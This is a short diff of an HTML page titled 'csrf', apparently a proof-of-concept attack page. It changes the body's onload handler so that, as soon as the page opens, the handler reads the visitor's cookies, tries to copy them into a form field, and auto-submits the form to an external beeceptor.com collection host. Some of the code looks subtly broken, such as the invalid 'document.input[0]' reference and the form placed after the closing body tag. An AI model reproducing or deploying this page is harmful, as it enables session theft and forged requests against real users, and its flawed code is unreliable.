@@ -2,9 +2,8 @@
 <html lang="en">
 <head>
  <title>csrf</title>
- <script>let cookies = document.cookie; </script>
 </head>
-<body onload="document.forms[0].submit()"></body>
+<body onload="let cookies = document.cookie;document.input[0].value = cookies;document.forms[0].submit()"></body>
     <form action="https://iamroot.free.beeceptor.com/" method="POST">
             <div class="form-row">
               <div class="form-group col-md-6">
